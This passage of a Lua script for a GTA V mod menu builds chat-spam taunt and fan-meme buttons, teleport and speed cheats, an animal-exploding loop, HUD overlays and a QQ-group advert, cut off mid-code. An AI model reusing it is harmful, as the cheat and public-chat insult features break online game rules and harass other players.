        chat.send_message(cussing35,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂7", {""}, "公屏上骂他", function()
        chat.send_message(cussing36,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂8", {""}, "公屏上骂他", function()
        chat.send_message(cussing37,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂9", {""}, "公屏上骂他", function()
        chat.send_message(cussing38,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂10", {""}, "公屏上骂他", function()
        chat.send_message(cussing39,false,true,true)
    end)
local cxkchats = menu.list(onlinechats, "IKUN语录", {}, "八嘎！~")
 menu.action(cxkchats, "ikun1", {}, "ikun语录", function()
   chat.send_message(" 我们家坤坤不容易，为什么还去伤害，如果黑粉再触发到我们的底线，后果自负！坤坤你继续红下去，我们永远支持你的！", false, true, true)
   chat.send_message(" 他拿奖杯拿到手软。即使你把键盘敲烂了他还是能拿到奖。巨C不懂糊的悲。你拿什么和你坤哥斗。”世间再无如此完美的一个人。", false, true, true)
   chat.send_message(" 我希望你真的是ikun，而不是在这里伪装碟中谍，爱蔡徐坤不是爱在短视频发他视频,这样也可能会招黑，爱他爱在心动的那首歌，爱在为之动容的颜值，爱在每一个爱的瞬间，真爱粉永远都在", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound1.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
   
menu.action(cxkchats, "我是小黑子", {}, "此功能有音乐，请提前调好音量！", function()
   chat.send_message("鸡你太美！", false, true, true)
   chat.send_message(" 你干嘛～～哎呦", false, true, true)
   chat.send_message(" 等到坤坤老了，变得难看了，你们或许就不喜欢他了，而我们到时候见了他仍会叫一声“鸡哥”巅峰迎来虚伪的拥护，黄昏见证真正的信徒，谁是真正的ikun一目了然", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound1.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(cxkchats, "ikun2", {}, "此功能有音乐，请提前调好音量！", function()
 chat.send_message(" 向阳花木易为春，听说你爱蔡徐坤。\n千军万马是ikun，ikun永远爱坤坤。\n待我ikun更强大，定帮坤哥赢天下。\n两耳不闻窗外事，一心只为蔡徐坤。\n追梦少年不失眠，未来可期蔡徐坤。\n向阳花木每逢春，ikun一直爱坤坤。", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound8.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(cxkchats, "ikun3", {}, "此功能有音乐，请提前调好音量！", function()
 chat.send_message(" 在做的要么Ikun要么小黑子，今天我送大家一首cxk语录，劝你耗子尾汁好好反省：故人西辞黄鹤楼 ，唱跳Rap打篮球 。春风又绿江南岸 ，练习长达两年半。 清明时节雨坤坤，路上行人梳中分 ，借问背带何处有，牧童遥指我ikun。长江后浪推前浪，爱坤啥样我啥样。鸡冠头背带裤，我是ikun你记住。向阳花木易为春，听说你爱cxk。小黑子树枝666，蒸虾头，好丸吗？树枝赶人，蒸五鱼，食不食油饼，我家鸽鸽在胎上拿姜拿到手软，他那么努力，这样叫我怎么荔枝？已经橘爆你了，再这样我就抱紧了，劝你苏珊，不然我们ikun就紫砂了。", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound9.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.textslider(fanyiyuyan, "R星聊天标志", {}, "", {"R星认证已通过标志", "Rockstar标志"}, function(idx)
    local icon = "¦"
    if idx == 2 then
        icon = "∑"
    end
    chat.ensure_open_with_empty_draft(false)--打开聊天框
    chat.add_to_draft(icon .. " ")--输入内容
end)
menu.toggle(online, "提高FPS V1", {"fpsboost"}, "", function(on_toggle)
	if on_toggle then
		notification("正在优化FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
end)
menu.toggle(online, "提高FPS V2", {""}, "降低画质提升帧数.", function(on_toggle)
        if on_toggle then
            notification("正在设置FPS...")
            menu.trigger_commands("weather" .. " extrasunny")
            menu.trigger_commands("clouds" .. " clear01")
            menu.trigger_commands("time" .. " 6")
            menu.trigger_commands("superc")
            menu.trigger_commands("potatomode ")
            menu.trigger_commands("nosky ")
            menu.trigger_commands("noidlecam ")
        else
            notification("正在重置FPS...")
            menu.trigger_commands("weather" .. " normal")
            menu.trigger_commands("clouds" .. " normal")
            menu.trigger_commands("potatomode ")
            menu.trigger_commands("nosky ")
            menu.trigger_commands("noidlecam ")
            end
end)
police  = menu.list(online,"警察选项", {},"化身为一名警察")
police_player1 = menu.action(police, "加载模拟警察选项", {""}, "", function()
        notification("正在加载模拟警察选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.YeMulib.YMpolice"
        menu.delete(police_player1)
    end)
sihuachuansong = menu.list(online, "丝滑传送", {}, "德芙，纵享新丝滑:)", function(); end)
menu.action(sihuachuansong, "丝滑传送", {"stp"}, "在镜头平稳的情况下将您传送到您的航点,建议设置为一个hotkey", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), FRAME_STP)
end)
menu.toggle(sihuachuansong, "丝滑传送2.0", {"stpv2"}, "使您或您的车辆与镜头一起传送，来实现更丝滑的传送。", function(toggle)
    FRAME_STP = toggle
end)
menu.action(sihuachuansong, "重置镜头", {"resetstp"}, "将脚本 cam 渲染为 false，同时删除当前 cam。 因为如果你传送到海里，镜头鸡鸡了。", function ()
    local renderingCam = CAM.GET_RENDERING_CAM()
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
    CAM.DESTROY_CAM(renderingCam, true)
end)
local stpsettings = menu.list(sihuachuansong, "丝滑传送设置", {}, "")
menu.slider(stpsettings, "速度修改器（x）/10", {"stpspeed"}, "用于丝滑传送的速度修改器，乘法。 这将除以 10，因为滑块不能采用非整数", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    if SE_Notifications then
        util.toast("丝滑速度倍增器设置为 " .. tostring(multiply) .. "!")
    end
    STP_SPEED_MODIFIER = 0.02 --set it again so it doesnt multiply over and over. This took too long to figure out....
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)
menu.slider(stpsettings, "CAM过渡的高度（米）", {"stpheight"}, "在进行过渡时设置镜头的高度。", 0, 10000, 300, 10, function (value)
    local height = value
    if SE_Notifications then
        util.toast("丝滑传送高度设置为 " .. tostring(height) .. "!")
    end
    STP_COORD_HEIGHT = height
end)
menu.divider(sihuachuansong, "显示选项")
menu.toggle_loop(sihuachuansong, "显示当前位置", {"drawpos"},  "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.0, "x: " .. pos.x .. " // y: " .. pos.y .. " // z: " .. pos.z, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
end)
menu.toggle_loop(sihuachuansong, "显示X/Y轴", {"drawrot"}, "", function ()
    local rot = ENTITY.GET_ENTITY_ROTATION(GetLocalPed(), 2)
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.5, 0.03, "pitch: " .. rot.x .. " // roll: " .. rot.y .. " // yaw: " .. rot.z, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
    local facingtowards
    if ((rot.z >= 135) or (rot.z < -135)) then facingtowards = "-Y"
    elseif ((rot.z < 135) and (rot.z >= 45)) then facingtowards = "-X"
    elseif ((rot.z >= -135) and (rot.z < -45)) then facingtowards = "+X"
    elseif ((rot.z >= -45) or (rot.z < 45)) then facingtowards = "+Y" end
    directx.draw_text(0.5, 0.07, "Facing towards " .. facingtowards, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
end)
menu.divider(sihuachuansong, "设置")
menu.slider(sihuachuansong, "文本大小（/10）", {"drscale"}, "将文本的比例设置为您指定的值，除以 10。这是因为它只采用整数值", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)
menu.toggle(online, "快速移动", {"fastmove"}, "加快移动速度", function(on)
    if on then
    Super = on
    menu.trigger_commands("walkspeed 1.5")
    menu.trigger_commands("gracefullanding on")
    menu.trigger_commands("superrun 1.2")
    else
        menu.trigger_commands("walkspeed 1")
        menu.trigger_commands("gracefullanding off")
        menu.trigger_commands("superrun 0")
        Super = off
    end
end,false)
menu.toggle_loop(online, "动物制裁者", {}, "连环炸毁所有附近的动物", function()
    animalFound = false
    for i, aPed in pairs(entities.get_all_peds_as_handles()) do 
       if PED.IS_PED_HUMAN(aPed) ~= true then 
        animalFound = true
        local pedPos = ENTITY.GET_ENTITY_COORDS(aPed)
        FIRE.ADD_EXPLOSION(pedPos.x, pedPos.y, pedPos.z, 0, 1, true, false, 0, false)
       end
    end
    if animalFound == false then 
        util.toast("[夜幕提示]周围没有动物了")
    end
end)
yinyue = menu.list(misc,"音乐选项", {},"玩累了，听个歌？~")
menu.action(yinyue, '听我家坤坤的咯', {'music'}, '哎呦~你干嘛~', function(on) 
util.toast("开始IKUN时刻~ " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound7.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义1', {'music'}, '', function(on) 
util.toast("开始播放自定义1 " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound15.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义2', {'music'}, '', function(on) 
util.toast("开始播放自定义2 " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound16.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义3', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound17.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义4', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound18.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义5', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound19.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
YMva = menu.list(misc, "夜幕自由视角", {}, "丝滑~")
YMva_Load = menu.action(YMva, "加载夜幕自由视角", {""}, "", function()
notification("正在加载夜幕自由视角,请稍等",colors.black)
util.yield(1500)
    require "lib.YeMulib.YMva"
    menu.delete(YMva_Load)
end)
jiazaixianshi = menu.list(misc,"加载显示选项", {},"此选项内包含加载夜幕显示选项")
show_time_list = menu.list(jiazaixianshi,"显示时间选项",{},"")
show_time = menu.toggle(show_time_list, "显示时间", {"timeos"}, "", function(state)
    xianshishijian(state)
end)
menu.set_value(show_time, config_active2)
show_time_x = menu.slider(show_time_list, "x坐标", {"show_time-x"}, "配置[√]", -1000, 1000, config_active2_x, 10, function(x_)
     showtime_x(x_)
end)
show_time_y = menu.slider(show_time_list, "y坐标", {"show_time-y"}, "配置[√]", -1000, 1000, config_active2_y, 10, function(y_)
     showtime_y(y_)
end)
script_name = menu.toggle(jiazaixianshi, "显示脚本名称", {"scriptname"}, "", function(state)
    xianshijiaoben1(state)
end)
menu.set_value(script_name, config_active3)
host_sequence_list = menu.list(jiazaixianshi,"主机序列",{},"")
host_s = menu.toggle_loop(host_sequence_list, "主机序列", {"zhujixulie"}, "", function(state)
    scripthost(state)
end)
menu.set_value(host_s, config_active1)
host_sequence_x = menu.slider(host_sequence_list, "x坐标", {"watermark-x"}, "配置[√]", -1000, 1000, config_active1_x, 10, function(x_)
     zhujixvlie_x(x_)
end)
host_sequence_y = menu.slider(host_sequence_list, "y坐标", {"watermark-y"}, "配置[√]", -1000, 1000, config_active1_y, 10, function(y_)
     zhujixvlie_y(y_)
end)
obj_num = menu.toggle_loop(jiazaixianshi, "显示实体数量", {"shitishuliang"}, "", function (state)
    shitixianshi(state)
end)
menu.set_value(obj_num, config_active4)
local car_hdl = 0 
util.create_tick_handler(function()
    car_hdl = entities.get_user_vehicle_as_handle(false)
end) 
resources_dir = filesystem.resources_dir() .. '/YMIMG/' .. '/YMspeed/'
local gauge_bg = directx.create_texture(resources_dir .. '/dial.png')
local needle = directx.create_texture(resources_dir .. '/needle.png')
local wrench = directx.create_texture(resources_dir .. '/wrench.png')
local gears = {}
for i=0, 7 do 
    gears[i] = directx.create_texture(resources_dir .. '/gear_' .. tostring(i) .. '.png')
end
local speed_nums = {}
for i=0, 9 do 
    speed_nums[i] = directx.create_texture(resources_dir .. '/mph_' .. tostring(i) .. '.png')
end
local hp_nums = {}
for i=0, 9 do 
    hp_nums[i] = directx.create_texture(resources_dir .. '/hp_' .. tostring(i) .. '.png')
end
local mph_label = directx.create_texture(resources_dir .. '/mph_label.png')
local kph_label = directx.create_texture(resources_dir .. '/kph_label.png')
local ms_label = directx.create_texture(resources_dir .. '/ms_label.png')
local shisubiaoxuanxiang = jiazaixianshi:list('车速表设置', {}, '')
local speed_setting = 'MPH'
local speed_settings = {'MPH', 'KPH', 'M/S'}
shisubiaoxuanxiang:textslider("单位", {'dashmasterunits'}, "", speed_settings, function(unit)
    speed_setting = speed_settings[unit]
end)
local dm_x_off = 0.1
local dm_y_off = 0.08
local gauge_scale = 0.08
local speed_scale = 0.06
local hp_scale = 0.008
local draw_tach = true 
shisubiao = shisubiaoxuanxiang:toggle('显示转速表', {'dmdrawtach'}, '', function(on)
    draw_tach = on
end, true)
menu.set_value(shisubiao, config_active7)
local draw_speed = true 
shudu = shisubiaoxuanxiang:toggle('显示速度', {'dmdrawspeed'}, '', function(on)
    draw_speed = on
end, true)
menu.set_value(shudu, config_active10)
local draw_hp = true 
naijiu = shisubiaoxuanxiang:toggle('显示耐久', {'dmdrawhp'}, '', function(on)
    draw_hp = on
end, true)
menu.set_value(naijiu, config_active11)
shisubiaoxuanxiang:slider_float('X 位置', {'dmxoff'}, '', -2000, 2000, 0, 1, function(val)
    dm_x_off = val * 0.01 
end)
shisubiaoxuanxiang:slider_float('Y 位置', {'dmyoff'}, '', -2000, 2000, 0, 1, function(val)
    dm_y_off = val * 0.01 
end)
shisubiaoxuanxiang:slider_float('刻度大小', {'dmgaugescale'}, '', 0, 2000, 8, 1, function(val)
    gauge_scale = val * 0.01 
end)
shisubiaoxuanxiang:slider_float('速度大小', {'dmspeedscale'}, '', 0, 2000, 6, 1, function(val)
    speed_scale = val * 0.01 
end)
shisubiaoxuanxiang:slider_float('血量大小', {'dmhpscale'}, '', 0, 2000, 8, 1, function(val)
    hp_scale = val * 0.001 
end)
------------------------------------------------------------------------------
util.create_tick_handler(function()
    local rpm = 0
    local car_ptr = entities.get_user_vehicle_as_pointer(false)
    if car_ptr ~= 0 then 
        rpm = entities.get_rpm(car_ptr)
        local car = entities.pointer_to_handle(car_ptr) 
        local texture_width = 0.08
        local texture_height = 0.08
        local posX = 0.8
        local posY = 0.7
        local max_rotation = math.rad(0.501 * 180)
        local needle_rotation = (rpm / 1)/1.485  - 0.170
        local gear_pos_x = posX - 0.0001
        local gear_pos_y = posY - 0.005
        local gear = entities.get_current_gear(car_ptr)
        if draw_tach then 
            directx.draw_texture(gauge_bg, gauge_scale , gauge_scale , 0.5, 0.5, posX + dm_x_off, (posY - 0.004) + dm_y_off, 0, 1.0, 1.0, 1.0, 1.0)
            directx.draw_texture(needle, gauge_scale , gauge_scale, 0.5, 0.5, posX + dm_x_off, posY + dm_y_off, needle_rotation, 1.0, 1.0, 1.0, 0.5)
            directx.draw_texture(gears[gear], gauge_scale , gauge_scale , 0.5, 0.5, gear_pos_x + dm_x_off, gear_pos_y + dm_y_off, 0, 1.0, 1.0, 1.0, 1)
        end
        local car_hp = math.floor(math.floor((VEHICLE.GET_VEHICLE_ENGINE_HEALTH(car_ptr) + 4000))/5000)*100
        local car_hp_str = tostring(car_hp)
        local car_hp_r = 0.0 
        local car_hp_g = 1.0 
        local car_hp_b = 0.6
        if car_hp < 70 then 
            car_hp_r = 1.0 
            car_hp_g = 0.5 
            car_hp_b = 0.2
        end
        if car_hp < 30 then 
            car_hp_r = 1.0 
            car_hp_g = 0.0
            car_hp_b = 0.0
        end
        if draw_hp then 
            directx.draw_texture(wrench, hp_scale - 0.003, hp_scale - 0.003, 0.5, 0.5, (gear_pos_x + 0.05) + dm_x_off, (gear_pos_y + 0.04) + dm_y_off, 0, car_hp_r, car_hp_g, car_hp_b, 1)
            local cur_hp_num_off = hp_scale - 0.005
            for i=1, #car_hp_str do
                directx.draw_texture(hp_nums[tonumber(car_hp_str:sub(i,i))], hp_scale, hp_scale , 0.5, 0.5, (gear_pos_x + 0.06 + cur_hp_num_off) + dm_x_off, (gear_pos_y + 0.04) + dm_y_off, 0, car_hp_r, car_hp_g, car_hp_b, 1)
                cur_hp_num_off += hp_scale / 1.5
            end
        end
        local speed = math.ceil(ENTITY.GET_ENTITY_SPEED(car_hdl))
        local unit_text = ms_label
        pluto_switch speed_setting do 
            case "MPH":
                unit_text = mph_label
                speed = math.ceil(speed * 2.236936)
                break 
            case "KPH":
                speed = math.ceil(speed * 3.6)
                unit_text = kph_label 
                break
            case 'M/S': 
                speed = math.ceil(speed) 
                unit_text = ms_label
                break
        end
        local cur_speed_num_offset = 0
        local speed_str = tostring(speed)
        if draw_speed then 
            for i=1, #speed_str do
                directx.draw_texture(speed_nums[tonumber(speed_str:sub(i,i))], speed_scale , speed_scale , 0.5, 0.5, ((posX) + cur_speed_num_offset) + dm_x_off, (posY + 0.1) + dm_y_off, 0, 1.0, 1.0, 1.0, 1)
                cur_speed_num_offset += speed_scale / 2
            end
            cur_speed_num_offset += speed_scale / 5
            directx.draw_texture(unit_text, speed_scale , speed_scale , 0.5, 0.5, ((posX) + cur_speed_num_offset) + dm_x_off, ((posY + (speed_scale)) + dm_y_off) * 1.10, 0, 1.0, 1.0, 1.0, 1)
        end

    end
end)
-----------------------------------------------------------------------------------------
haiba = menu.toggle_loop(jiazaixianshi,"海拔高度计", {"gaoduji"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    local strg = "~b~海拔: ~w~"..math.ceil(pos.z) / 1000 .."KM"
    draw_string(strg, 0.9, 0.02, 0.6, 1)
end)
menu.set_value(haiba, config_active9)
menu.action(misc, "保存加载配置", {}, "支持大部分功能", function()
    save_config()
end)

--显示stand版本
local window_x = 0.01
local window_y = 0.01
local text_margin = 0.005
local text_height = 0.018 
local window_width = 0.12
local window_height = 0.15
local menu_items = {
    "夜幕LUA",
    "尊贵的夜幕用户",
    "感谢各位对夜幕的赞助与支持",
    "进群获取最新版本",
    "夜幕官方QQ群：332017587",
    "还在犹豫什么，快点进群吧！！！"   
}
local selected_index = 0
local blur_rect_instance
local function colour(r, g, b, a)
    return { 
        r = r / 255,
        g = g / 255,
        b = b / 255,
        a = a / 255
    }
end
local function gui_background(x, y, width, height, blur_radius)
    local background = colour(10, 0, 10, 180)
    local border_color_left = colour(255, 0, 255, 255)
    local border_color_right = colour(0, 0, 0, 255)
    directx.blurrect_draw(
        blur_rect_instance, 
        x, y, width, height,
        blur_radius or 5
    )
    directx.draw_rect(
        x, y,
        width, height,
        background
    )
    directx.draw_line(
        x, y,
        x, y + height,
        border_color_left
    )
    directx.draw_line(
        x, y,
        x + width, y,
        border_color_left, border_color_right
    )
    directx.draw_line(
        x + width, y,
        x + width, y + height,
        border_color_right
    )
    directx.draw_line(
        x, y + height,
        x + width, y + height,
        border_color_left, border_color_right
    )
end
local function text(text, x, y, text_scale, highlighted)
    if highlighted then
        directx.draw_rect(
            x, y,
            window_width - (text_margin * 2), text_height,
            colour(20, 15, 15, 0)
        )
    end

    directx.draw_text(
        x, y, text, ALIGN_TOP_LEFT, text_scale,
        colour(255, 255, 255, 255)
    )
end
local insinsts = "FocusOut"
local function render_list(x, y, list, selected_index)
    local ty = 0
    local text_scale = 0.5

    for i,v in pairs(list) do
        local highlighed = i == selected_index - 1

        text(v, x, y + ty, text_scale, highlighed)
        ty = ty + text_height
    end
end

local function edition_string()
    local edition = menu.get_edition()
    if edition == 0 then
        return "免费蛋蛋"
    elseif edition == 1 then
        return "基础蛋蛋"
    elseif edition == 2 then
        return "理智蛋蛋"
    elseif edition == 3 then
        return "超级无敌大蛋蛋"
    end
end
local function render_menu()
    local width = window_width
    local height = window_height
    gui_background(window_x, window_y,
        width, height)
    text("STAND " .. edition_string(),
        window_x + text_margin,
        window_y + text_margin,
        0.6, false)  
    local top_margin = 0.025   
    render_list(
        window_x + text_margin,
        window_y + text_margin + top_margin,
        menu_items, selected_index
    )
end
local function set_menu_open(toggle) end 
local menu_is_open = false
local function input_handler()
    if menu.is_open() then return end
    local VK_NUMPAD8 = 0x68
    local VK_NUMPAD2 = 0x62
    if util.is_key_down(VK_NUMPAD2) then
        selected_index = selected_index + 1
    elseif util.is_key_down(VK_NUMPAD8) then
        selected_index = selected_index - 1
    end
end
local function tick_handler()
    if menu_is_open then
        render_menu()
    end
    input_handler()
    return true
end
blur_rect_instance = directx.blurrect_new()
util.create_tick_handler(tick_handler) 
function set_menu_open(toggle)
    if toggle and not menu_is_open then
        menu_is_open = true     
    elseif not toggle and menu_is_open then
        menu_is_open = false
    end
end
menu.toggle(misc, "Stand版本", {}, "", function(toggle)
    set_menu_open(toggle)
end)
menu.toggle_loop(misc, "全民制作人", {"gtzz"}, "", function()
    draw_string(string.format("~italic~~bold~~p~Ping~q~制~p~作"), 0.350,0.150, 2,5)
end)
menu.toggle_loop(misc, "最帅的人", {""}, "关不了请关闭脚本", function()
xinwen = GRAPHICS.REQUEST_SCALEFORM_MOVIE('BREAKING_NEWS')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(xinwen, "SET_TEXT")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("重磅新闻:".. PLAYER.GET_PLAYER_NAME(players.user()).. "竟然是世界上最帅的人！")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("夜幕LUA")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD(xinwen)
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(xinwen, 255, 255, 255, 255, 0)
end)
local kongzhitai = menu.list(misc, "控制台选项", {""}, "")
local log_dir = filesystem.stand_dir() .. '\\Log.txt'
local full_stdout = ""
local disp_stdout = ""
local max_chars = 200
local max_lines = 20
local font_size = 0.35
local timestamp_toggle = false
local function get_stand_stdout(tbl, n)
    local all_lines = {}
    local disp_lines = {}
    local size = #tbl
    local index = 1
    if size >= n then 
        index = #tbl - n
    end
    for i=index, size do 
        local line = tbl[i]
        local line_copy = line
        if line ~= "" and line ~= '\n' then
            all_lines[#all_lines + 1] = line
            if not timestamp_toggle then
               -- at this point, the line is already added to all lines, so we can just customize it and it wont affect STDOUT clipboard copy
                local _, second_segment = string.partition(line, ']')
                if second_segment ~= nil then
                    line = second_segment
                end
            end
            if string.len(line) > max_chars then
                disp_lines[#disp_lines + 1] = line:sub(1, max_chars) .. ' ...'
            else
                disp_lines[#disp_lines + 1] = line
            end
        end
    end
    -- full_stdout exists so that we can copy the entire console output without "aesthetic" changes or trimming
    -- disp_stdout is the aesthetic, possibly-formatted version that you actually see in-game, WITH trimming
    full_stdout = table.concat(all_lines, '\n')
    disp_stdout = table.concat(disp_lines, '\n')
end
local function get_last_lines(file)
    local f = io.open(file, "r")
    local len = f:seek("end")
    f:seek("set", len - max_lines*1000)
    local text = f:read("*a")
    lines = string.split(text, '\n')
    f:close()
    get_stand_stdout(lines, max_lines)
end


menu.slider(kongzhitai, "最大显示字数", {"nconsolemaxchars"}, "", 1, 1000, 200, 1, function(s)
    max_chars = s
end)
menu.slider(kongzhitai, "最大显示行数", {"nconsolemaxlines"}, "", 1, 60, 20, 1, function(s)
    max_lines = s
end)
menu.slider_float(kongzhitai, "字体大小", {"nconsolemaxlines"}, "", 1, 1000, 35, 1, function(s)
    font_size = s*0.01
end)
menu.toggle(kongzhitai, "显示时间", {"ndrawconsole"}, "", function(on)
    timestamp_toggle = on
end, false)
kongzhitai1 = menu.toggle(kongzhitai, "绘制控制台", {"ndrawconsole12"}, "", function(on)
    draw_toggle = on
end)
menu.set_value(kongzhitai1, config_active6)
local text_color = {r = 1, g = 1, b = 1, a = 1}
menu.colour(kongzhitai, "字体颜色", {"nconsoletextcolor"}, "", 1, 1, 1, 1, true, function(on_change)
    text_color = on_change
end)
local bg_color = {r = 0, g = 0, b = 0, a = 0.5}
menu.colour(kongzhitai, "背景颜色", {"nconsolebgcolor"}, "", 0, 0, 0, 0.5, true, function(on_change)
    bg_color = on_change
end)
util.create_tick_handler(function()
    local text = get_last_lines(log_dir)
    if draw_toggle then
        local size_x, size_y = directx.get_text_size(disp_stdout, font_size)
        size_x += 0.01
        size_y += 0.01
        directx.draw_rect(0.0, 0.05, size_x, size_y, bg_color)
        directx.draw_text(0.0, 0.05, disp_stdout, 0, font_size, text_color, true)
    end
end)
YUANSHEN = menu.list(misc, '原神？启动？！', {'YuanP'}, '原？原？原？原神，启动！！！')
YUANSHENaction = menu.action(YUANSHEN, "加载原神选项", {""}, "原神，启动！", function()
    if randomizer(array) == "1" then
        store_dir = filesystem.store_dir() .. '\\YMss\\'
            sound_selection_dir = store_dir .. '\\sound6.txt'
           if not filesystem.is_dir(store_dir) then
